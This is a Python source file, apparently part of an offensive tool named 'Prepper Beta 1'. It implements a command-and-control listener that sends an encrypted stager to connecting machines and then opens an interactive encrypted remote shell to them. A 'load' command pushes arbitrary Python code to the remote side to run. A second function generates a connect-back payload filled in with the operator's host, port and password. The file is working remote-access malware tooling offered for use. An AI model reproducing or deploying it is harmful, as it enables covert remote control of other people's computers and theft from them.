import socket
import time
import pervise_api
import color
import hashlib

shellcode = """"""

def listen(bind_ip,bind_port,password):
    global shellcode
    try:
        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.bind((bind_ip,int(bind_port)))
        server.listen(5)
        print('[*] Listening in %s:%s' % (bind_ip,bind_port))
        hash_tool = hashlib.md5()
        hash_tool.update(password.encode())
        password = hash_tool.hexdigest()
        with open('./Libs/prepper/attack/prepper_shellcode.py', 'r') as payload:
            shellcode = payload.read().replace("{PREPPER PORT}",str(bind_port)).replace("{PREPPER MD5}",str(password))
        shellcode = pervise_api.enctry(shellcode,password)
    except Exception as e:
        color.printRed('[-] Error.')
        color.printRed(str(e))
        return -1
    while True:
        try:
            client,addr = server.accept()
            color.printGreen('[*] New connect from '+str(addr))
            client.send(shellcode.encode())
            client.close()
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((bind_ip, int(bind_port)))
            server.listen(5)
            client,addr = server.accept()
            while True:
                try:
                    cmd = input('Prepper> ')
                    if 'load' in cmd.lower():
                        client.send(pervise_api.enctry('load',password).encode())
                        cmds = cmd.split()
                        try:
                            library = cmds[1]
                            with open(library,'r') as lib:
                                library = lib.read()
                            client.send(pervise_api.enctry(library,password).encode())
                            client.settimeout(240)
                            print(pervise_api.dectry(client.recv(81962).decode('gbk'),password))
                            continue
                        except Exception as e:
                            color.printRed('[-] Failed.')
                            color.printRed(str(e))
                            color.printGreen('Usage: load [FILE PATH]')
                            color.printGreen('Example: load D:\\\\test.py')
                            continue
                    cmd = pervise_api.enctry(cmd,password)
                    client.send(cmd.encode())
                    res = pervise_api.dectry(client.recv(81926).decode('gbk'),password)
                    print(res)
                    if 'exit' in cmd.lower() or 'goodbye' in res.lower():
                        return 0
                except Exception as e:
                    color.printRed(str(e))
                    return 0
        except Exception as e:
            color.printRed('[-] Error.')
            color.printRed(str(e))
            continue


def payload(bind_ip,bind_port,password,file_path):
    hash_tool = hashlib.md5()
    hash_tool.update(password.encode())
    password = hash_tool.hexdigest()
    payload_source = ''
    try:
        with open('./Libs/prepper/payload/payload.py','r') as payload:
            payload_source = payload.read().replace("{PREPPER HOST}",bind_ip).replace("{PREPPER PORT}",str(bind_port)).replace("{PREPPER MD5}",str(password))
        with open(file_path,'w') as payload:
            payload.write(payload_source)
    except:
        print('[-] Error.')
        return -1
    print('[*] File path: '+str(file_path))
    print('[*] Payload size: '+str(len(payload_source)))


def info():
    logo = """
__________                                            
\\______   \\_______   ____ ______ ______   ___________ 
 |     ___/\\_  __ \\_/ __ \\\\____ \\\\____ \\_/ __ \\_  __ \\
 |    |     |  | \\/\\  ___/|  |_> >  |_> >  ___/|  | \\/
 |____|     |__|    \\___  >   __/|   __/ \\___  >__|   
                        \/|__|   |__|        \\/       
    """
    color.printRed(logo)
    color.printRed('Prepper Beta 1')
    color.printGreen('Usage:')
    color.printGreen('    - make prepper listen [IP] [PORT] [PASSWORD]')
    color.printGreen('    - make prepper payload [IP] [PORT] [PASSWORD] [FILE PATH](EX:D:\\\\payload.py)')